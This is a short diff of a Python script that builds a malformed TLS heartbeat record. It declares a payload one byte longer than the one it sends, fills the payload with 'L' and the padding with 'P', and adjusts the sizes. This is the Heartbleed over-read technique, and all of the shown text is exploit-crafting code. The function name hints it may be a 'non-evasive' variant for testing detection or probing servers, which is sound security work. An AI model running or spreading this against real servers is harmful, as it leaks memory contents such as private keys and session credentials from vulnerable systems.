@@ -47,12 +47,22 @@ hb = h2bin('''
 ''')
 
 def create_nonevasive():
-    size = 16
-    payloadlength = size - 3
-    heartbeat = "180302%04X01%04X" % (size, size - 3)
+    # minimum size varies with daemon
+    size = 4096
 
+    # number of bytes to overrun.
+    overrun = 1
+    paddinglength = 16
+    payloadlength = size - paddinglength - 3
+    heartbeat = "180302%04X01%04X" % (size, payloadlength + overrun)
+
+    # fill payload with L
     for i in range(payloadlength):
 	heartbeat += '4C'
+
+    # fill padding with P
+    for i in range(paddinglength):
+	heartbeat += '50'
 
     return h2bin(heartbeat)
 
